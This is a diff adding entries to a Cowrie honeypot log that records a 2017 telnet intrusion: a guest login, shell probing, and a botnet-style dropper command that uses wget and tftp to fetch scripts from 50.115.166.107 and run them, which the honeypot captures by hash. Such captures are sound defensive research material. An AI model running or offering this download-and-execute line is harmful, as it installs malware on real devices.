@@ -2192,3 +2192,34 @@
 2017-04-20T03:28:19+0000 [-] unauthorized login: 
 2017-04-20T03:28:19+0000 [HoneyPotSSHTransport,13912,149.56.24.226] connection lost
 2017-04-20T03:28:19+0000 [HoneyPotSSHTransport,13912,149.56.24.226] Connection lost after 4 seconds
+2017-04-20T03:29:18+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.32.197.221:50894 (10.8.41.81:2223) [session: TT8530]
+2017-04-20T03:29:18+0000 [CowrieTelnetTransport,8530,45.32.197.221] login attempt: 16
+2017-04-20T03:29:18+0000 [CowrieTelnetTransport,8530,45.32.197.221] login return, expect: [guest/]
+2017-04-20T03:29:18+0000 [CowrieTelnetTransport,8530,45.32.197.221] login attempt [guest/] succeeded
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] Opening TTY Log: log/tty/20170420-032920-None-8530i.log
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] Warning: state changed and new state returned
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] CMD: sh
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] Command found: sh 
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] CMD: shell
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] Command not found: shell
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] CMD: help
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] Command found: help 
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] CMD: busybox
+2017-04-20T03:29:20+0000 [CowrieTelnetTransport,8530,45.32.197.221] Command found: busybox 
+2017-04-20T03:29:31+0000 [CowrieTelnetTransport,8530,45.32.197.221] CMD: cd /tmp || cd /var/tmp; wget http://50.115.166.107/bins.sh; sh bins.sh; tftp -r tftp2.sh -g 50.115.166.107; sh tftp2.sh
+2017-04-20T03:29:31+0000 [CowrieTelnetTransport,8530,45.32.197.221] Command found: cd /tmp
+2017-04-20T03:29:31+0000 [CowrieTelnetTransport,8530,45.32.197.221] Command found: cd /var/tmp
+2017-04-20T03:29:31+0000 [CowrieTelnetTransport,8530,45.32.197.221] Command found: wget http://50.115.166.107/bins.sh
+2017-04-20T03:29:31+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://50.115.166.107/bins.sh>
+2017-04-20T03:29:31+0000 [HTTPPageDownloader,client] Not storing duplicate content c82e0583239cba341f6630b25e80d180ec7a641614d135972ab845ae34b9c629
+2017-04-20T03:29:31+0000 [HTTPPageDownloader,client] Downloaded URL (http://50.115.166.107/bins.sh) with SHA-256 c82e0583239cba341f6630b25e80d180ec7a641614d135972ab845ae34b9c629 to dl/c82e0583239cba341f6630b25e80d180ec7a641614d135972ab845ae34b9c629
+2017-04-20T03:29:31+0000 [HTTPPageDownloader,client] Command found: sh /var/tmp/bins.sh
+2017-04-20T03:29:31+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 50.115.166.107
+2017-04-20T03:29:31+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-04-20T03:29:31+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://50.115.166.107/bins.sh>
+2017-04-20T03:29:43+0000 [CowrieTelnetTransport,8530,45.32.197.221] Not storing duplicate content c82e0583239cba341f6630b25e80d180ec7a641614d135972ab845ae34b9c629
+2017-04-20T03:29:43+0000 [CowrieTelnetTransport,8530,45.32.197.221] Saved redir contents with SHA-256 c82e0583239cba341f6630b25e80d180ec7a641614d135972ab845ae34b9c629 to dl/c82e0583239cba341f6630b25e80d180ec7a641614d135972ab845ae34b9c629
+2017-04-20T03:29:43+0000 [CowrieTelnetTransport,8530,45.32.197.221] Closing TTY Log: log/tty/20170420-032920-None-8530i.log after 22 seconds
+2017-04-20T03:29:43+0000 [CowrieTelnetTransport,8530,45.32.197.221] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-04-20T03:29:43+0000 [CowrieTelnetTransport,8530,45.32.197.221] Connection lost after 24 seconds
